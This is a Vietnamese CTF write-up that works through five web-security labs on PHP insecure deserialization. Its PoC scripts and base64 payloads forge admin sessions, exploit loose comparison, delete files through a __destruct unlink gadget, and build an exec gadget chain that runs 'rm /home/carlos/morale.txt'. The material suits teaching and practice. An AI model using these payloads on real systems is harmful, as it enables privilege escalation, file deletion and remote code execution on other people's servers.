---
title: "Insecure-deserialization-lab"
excerpt: "Jannuary 17, 2024 04:00 PM ICT to Jannuary 17, 2024 04:00 PM ICT"

header:
show_date: true
header:
  teaser: "../assets/images/images-icon/deserial.jpg"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
  - Deserialize
---

<p align="center">
<img src="https://l3mnt2010.github.io/assets/images/images-icon/deserial.jpg" alt="">
</p>

# Insecure deserialization



## Lab: Modifying serialized objects

- Đề bài yêu cầu như sau:
- ![image](https://hackmd.io/_uploads/ryuOh7Y0T.png)

- Như ta thấy thì lab chứa lỗ hổng Insecure deserialization do đó dễ bị leo thang đặc quyền vào nhiệm vụ là ta đạt được quyền quản trị sau đó xóa carlos.

- Let's go bắt đầu bài lab nào:
- Đăng nhập với viewner:
- ![image](https://hackmd.io/_uploads/rkFZa7KR6.png)

- Quan sát thấy có chức năng đổi email người dùng.
- ![image](https://hackmd.io/_uploads/Hy4q67K0T.png)

- cơ bản thì không thấy gì nhưng mà để ý session:
- ![image](https://hackmd.io/_uploads/Hy5367FR6.png)

- Server lại lưu phiên với serialize:<


```
<?php

$a= "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d";

$a = base64_decode($a);

$b= unserialize($a);

print_r($b);

?>

-> __PHP_Incomplete_Class Object
(
    [__PHP_Incomplete_Class_Name] => User
    [username] => wiener
    [admin] =>
)
```
- Class chứa 2 thuộc tính là username và admin có vẻ đây là xét có phải admin hay không.

- Bây giờ mình đánh cắp phiên `admin` bằng cách đổi admin thành `1`.


```
<?php

class User {
   public  $username; 
   public  $admin;
   function __construct($username, $admin){
      $this->username = $username;
      $this->admin = $admin;
   }

}

$poc = new User("viewner", true);

$poc = serialize($poc);

echo base64_encode($poc);

// $a= "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d";

// $a = base64_decode($a);

// $b= unserialize($a);

// print_r($b);

?>

```

`Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=`

- ![image](https://hackmd.io/_uploads/Bycx7NF06.png)

- ![image](https://hackmd.io/_uploads/ryYNmVKCa.png)

- Bây giờ thì xóa user `carlos` và solved bài lab:
- ![image](https://hackmd.io/_uploads/By4DmNY06.png)

- ![image](https://hackmd.io/_uploads/r1e_mEK0a.png)


## Lab: Modifying serialized data types

- Đề bài yêu cầu như sau:
- ![image](https://hackmd.io/_uploads/Bkuw4NtCa.png)

- Yêu cầu tương tự như bài trên là xóa `carlos` với tư cách quản trị viên.
- ![image](https://hackmd.io/_uploads/Sk2FF4K06.png)

- ![image](https://hackmd.io/_uploads/ryFnFVtCa.png)

```
<?php

// class User {
//    public  $username; 
//    public  $access_token;
//    function __construct($username, $access_token){
//       $this->username = $username;
//       $this->access_token = $admin;
//    }

// }

// $poc = new User("viewner", true);

// $poc = serialize($poc);

// echo base64_encode($poc);

$a= "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJuNGF1ampocms1eHhyZzA0a3BrMmVzdXIzN3A0eWUzOCI7fQ==";

$a = base64_decode($a);

$b= unserialize($a);

print_r($b);

?>

----->
__PHP_Incomplete_Class Object
(
    [__PHP_Incomplete_Class_Name] => User
    [username] => wiener
    [access_token] => n4aujjhrk5xxrg04kpk2esur37p4ye38
)

```

- ở đây khác với ở trên là check token thay vì boolean, nên mình sẽ thay `username` thành `administrator` nhưng đồng thời access-token được lose compare để mình sẽ khai khác type jugging.
```
<?php

class User {
   public  $username; 
   public  $access_token;
   function __construct($username, $access_token){
      $this->username = $username;
      $this->access_token = $access_token;
   }

}

$poc = new User("administrator", 0);

$poc = serialize($poc);

echo base64_encode($poc);

// $a= "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJuNGF1ampocms1eHhyZzA0a3BrMmVzdXIzN3A0eWUzOCI7fQ==";

// $a = base64_decode($a);

// $b= unserialize($a);

// print_r($b);

--> Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
?>
```

- Thay session và ta nhận được phiên admin
- ![image](https://hackmd.io/_uploads/B14BNrKA6.png)

- ![image](https://hackmd.io/_uploads/HJvwNrYRa.png)

- Truy cập admin và xóa `carlos` thui :-1:  hihi
- ![image](https://hackmd.io/_uploads/H149ErtAa.png)

- ![image](https://hackmd.io/_uploads/SkQiVBY0T.png)

## Lab: Using application functionality to exploit insecure deserialization

- Đề bài yêu cầu chúng ta như sau:
- ![image](https://hackmd.io/_uploads/HJye_rYRT.png)

- Có thể thấy bài lab yêu cầu chúng ta lợi dụng serialize để xóa file morale.txt nằm trong thư mục home của user carlos.

- Bắt đầu thui nào:>

- ![image](https://hackmd.io/_uploads/S1e4tHKAT.png)

- Bài này có chức năng thay đổi email, upload avatar và xóa tài khoản bây giờ thử xóa thử xem nhưng ta bắt request nha:>
- ![image](https://hackmd.io/_uploads/HJpYFHYAT.png)

- Khi mà xóa thì mình lại gửi 1 serial đã được base64 lên sever để xóa, lợi dụng thuộc tính avatar link để xóa dữ liệu lưu trữ trên sever nha.

```
<?php


$a= "Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJvYjRuZmRmZTVodHZ3dXlrcG4wenlrYnZqaDY0NXV4dyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d";

$a = base64_decode($a);

$b= unserialize($a);

print_r($b);

---> 
__PHP_Incomplete_Class Object
(
    [__PHP_Incomplete_Class_Name] => User
    [username] => wiener
    [access_token] => ob4nfdfe5htvwuykpn0zykbvjh645uxw
    [avatar_link] => users/wiener/avatar
)

?>
```
- Bây giờ ta sẽ tạo lại object User này.


```
<?php

class User {
   public  $username; 
   public  $access_token;
   public $avatar_link;
   function __construct($username, $access_token,$avatar_link){
      $this->username = $username;
      $this->access_token = $access_token;
      $this->avatar_link = $avatar_link;
   }

}

$poc = new User("viewner", " ob4nfdfe5htvwuykpn0zykbvjh645uxw", "/home/carlos/morale.txt");

$poc = serialize($poc);

echo base64_encode($poc);

// $a= "Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJvYjRuZmRmZTVodHZ3dXlrcG4wenlrYnZqaDY0NXV4dyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MTk6InVzZXJzL3dpZW5lci9hdmF0YXIiO30%3d";

// $a = base64_decode($a);

// $b= unserialize($a);

// print_r($b);

?>
```

- `Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJvYjRuZmRmZTVodHZ3dXlrcG4wenlrYnZqaDY0NXV4dyI7czoxMToiYXZhdGFyX2xpbmsiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9`
- Gửi session để delete và solved bài lab.
- ![image](https://hackmd.io/_uploads/SkTgjrYR6.png)

- ![image](https://hackmd.io/_uploads/Byo2iHFRp.png)

- ![image](https://hackmd.io/_uploads/HkBTjBFR6.png)

## Lab: Arbitrary object injection in PHP

- Đề bài cho chúng ta như sau:
- ![image](https://hackmd.io/_uploads/ByV82HFAp.png)

- Yêu cầu vẫn là xóa file morale.txt từ carlos trên sever.

- Bắt đầu bài lab thui.
- ![image](https://hackmd.io/_uploads/SJe32HY0p.png)

- Đăng nhập với viewner.
- ![image](https://hackmd.io/_uploads/rJVzTrFAa.png)

- Phát hiện ra gợi ý lỗ hổng serialize object ở `/my-account`

- ![image](https://hackmd.io/_uploads/HkEp6StCT.png)

- Nhưng mà ở đây khác bài trước là ta không tìm thấy cách để xóa luôn, giờ thì mình thử recon thêm.
- Sau đó mình phát hiện ra có 1 file cũng được load là ``/libs/CustomTemplate.php``
- ![image](https://hackmd.io/_uploads/r14jkLFCT.png)

- Nhưng mà khi get thì file này render ở sever side nên không thể đọc source lúc nào mình dùng trick ~ để đọc file backup và được lun:>
- ![image](https://hackmd.io/_uploads/BkGlxUt0T.png)

```

<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}

?>
```
- Ta có thể thấy đây là 1 thư viện để hiển thị template chứa 2 tham số trong class CustomTeamplate, hàm __destruct() là một magic method sẽ được gọi khi đây là phương thức được xử lí các tác vụ cuối cùng khi một đối tượng bị hủy hoặc giải phóng bộ nhớ.

- Vì vậy chúng ta có thể lợi dụng hàm này và hàm unlink để xóa file morale.txt từ carlos vì khi mà 1 đối tượng bị hủy thì sẽ gọi đến destruct

- Triển khai:

```
<?php

class User {
   public  $username; 
   public  $access_token;
   function __construct($username, $access_token){
      $this->username = $username;
      $this->access_token = $access_token;
   }

}

// $poc = new User("viewner", " ob4nfdfe5htvwuykpn0zykbvjh645uxw", "/home/carlos/morale.txt");

// $poc = serialize($poc);

// echo base64_encode($poc);

$a= "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ3bjYxYjFhMmphZWpoODZsbGxqaDc3NWo2eG9qNGdveCI7fQ%3d%3d";

$a = base64_decode($a);

$b= unserialize($a);

print_r($b);

?>

---> 
(
    [username] => wiener
    [access_token] => wn61b1a2jaejh86llljh775j6xoj4gox
)
```


- POC:

```
<?php


class CustomTemplate {
    private $template_file_path;
    private $lock_file_path= "/home/carlos/morale.txt";

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            if (file_put_contents($this->lock_file_path, "") === false) {
                throw new Exception("Could not write to " . $this->lock_file_path);
            }
            if (file_put_contents($this->template_file_path, $template) === false) {
                throw new Exception("Could not write to " . $this->template_file_path);
            }
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        if (file_exists($this->lock_file_path)) {
            unlink($this->lock_file_path);
        }
    }
}


class User {
   public  $username; 
   public  $access_token;
   function __construct($username, $access_token){
      $this->username = $username;
      $this->access_token = $access_token;
   }

}

// $poc = new User("viewner", " ob4nfdfe5htvwuykpn0zykbvjh645uxw");

$poc = new CustomTemplate("/home/carlos/morale.txt");


$poc = serialize($poc);

echo base64_encode($poc);

// $a= "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJ3bjYxYjFhMmphZWpoODZsbGxqaDc3NWo2eG9qNGdveCI7fQ%3d%3d";

// $a = base64_decode($a);

// $b= unserialize($a);

// print_r($b);

?>
---> TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzQ6IgBDdXN0b21UZW1wbGF0ZQB0ZW1wbGF0ZV9maWxlX3BhdGgiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0IjtzOjMwOiIAQ3VzdG9tVGVtcGxhdGUAbG9ja19maWxlX3BhdGgiO3M6Mjg6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0LmxvY2siO30=
```

- ![image](https://hackmd.io/_uploads/HkmMQ8tR6.png)

- ![image](https://hackmd.io/_uploads/ByTiQ8YRT.png)

- Mặc dù 500 nhưng mà khi server deserialize thì đã gọi hàm destruct và xóa file morale.txt rồi nên bài lab được solved:
- ![image](https://hackmd.io/_uploads/BkoJEIFAp.png)


## Lab: Developing a custom gadget chain for PHP deserialization

- ![image](https://hackmd.io/_uploads/Sk5CfvFCp.png)

- Đề bài yêu cầu tận dụng lỗ hổng desirealize dẫn đến RCE để xóa file `morale.txt` trong thư mục home của carlos trên server.
- Giao diện ta vào đầu tiên sẽ như thế này:
- ![image](https://hackmd.io/_uploads/Hy7SXvYRa.png)

- Bắt đầu bước recon ta sẽ đi khám phá tất cả những chức năng của bài lab:
- Có thể thấy trang web vẫn chứa lỗ hổng insecure deserialize ở /my-account
- ![image](https://hackmd.io/_uploads/B1opXwYCp.png)
- Nhưng mà vẫn chưa thấy class để chúng ta có thể khai thác để thực thi RCE.

- Quan sát kỹ một tí trong target ta thấy 
- ![image](https://hackmd.io/_uploads/B1FbNPtRT.png)

- ![image](https://hackmd.io/_uploads/B16MEwKCp.png)

- Đây có vẻ là một file php nhưng mà render ở trên sever side cho nên ta không đọc được, sử dụng trick như bài trên để đọc được file backup của nó.
- ![image](https://hackmd.io/_uploads/HkhUNvFR6.png)

```
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```
* CustomTemplate : 
- Ta có có thể thấy magic method `__construct` được gọi khi mà 1 đối tượng mới được khởi tạo từ `CustomTemplate`
- Nhận tham số mặc định là `$desc_type='HTML_DESC'` sau đó tạo một đối tượng mới từ `class Description` gán vào giá trị của `desc` trong class này, sau đó gọi đến phương thức `build_product` gán `product` bằng việc khởi tạo một đối tượng mới từ class `Product` 


* DefaultMap :-1: 

- Chú ý đến class này có một thuộc tính private là `$callback` khi khởi tạo sẽ gán bằng giá trị truyền vào và có  magic method `__get()` sẽ gọi hàm `return call_user_func($this->callback, $name);` vì vậy nếu như ta control callback này là một hàm thực thi thì ta có thể RCE được.

- Thêm một ý quan trọng là method `__get()` sẽ được gọi khi mà một đối tượng gọi 1 phương thức không tồn tại hoặc không thể sử dụng của nó.

- Từ các phân tích trên thì mình có thể xây dựng được POC như sau:

```
<?php

class CustomTemplate {
                                        public $default_desc_type;
                                        public $desc;
                                    
                                    }

class DefaultMap {
                                        public $callback;
                                    
                                        public function __construct($callback) {
                                            $this->callback = $callback;
                                        }
                                    
                                        public function __get($name) {
                                            return call_user_func($this->callback, $name);
                                        }
                                    }

$b = new DefaultMap("exec");

$a = new CustomTemplate();

$a->default_desc_type="rm /home/carlos/morale.txt";

$a->desc = $b;

$poc = serialize($a);

echo base64_encode($poc);

?>

- ![image](https://hackmd.io/_uploads/HJVOBl5Ra.png)


```

- giải thích một chút nha ở đây sau khi deserial thì sẽ gọi đến magic method ``__wakeup()`` sau đó tiến hành gọi method `build_product` tiến hành gán giá trị cho thuộc tính `product` là khởi tạo đối tượng từ class `Product` truyền vào 2 giá trị `$this->default_desc_type, $this->desc` sau đó tiến hành gán giá trị `desc` bằng giá trị ``$desc->$default_desc_type`` nhưng mà như POC ở trên ta không có thuộc tính `default_desc_type` của $desc được khởi tạo vì mình gán nó bằng đối tượng được khởi tạo từ `DefaultMap` rồi vì vậy cho nên lúc này server sẽ hiểu là phải gọi đến thuộc tính của đôi tượng từ `DefaultMap` này mà nó không tồn tại cho nên magic method `__get($name)` sẽ được gọi để gọi đến hàm `call_user_func` với 2 tham số là `callback="exec"` và `name=` sẽ có giá trị là `default_desc_type` vì vậy nên hàm thực thi xóa file morale.txt trong thư mục home trên máy chủ của `carlos` sẽ bị xóa và bài lab được solved.

- ![image](https://hackmd.io/_uploads/BJEeLx506.png)

- `TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MTc6ImRlZmF1bHRfZGVzY190eXBlIjtzOjI2OiJybSAvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7czo0OiJkZXNjIjtPOjEwOiJEZWZhdWx0TWFwIjoxOntzOjg6ImNhbGxiYWNrIjtzOjQ6ImV4ZWMiO319`

- ![image](https://hackmd.io/_uploads/S1BZIg5Ra.png)

- ![image](https://hackmd.io/_uploads/ryKZ8e5Ap.png)

- ![image](https://hackmd.io/_uploads/S1dMIxcCT.png)
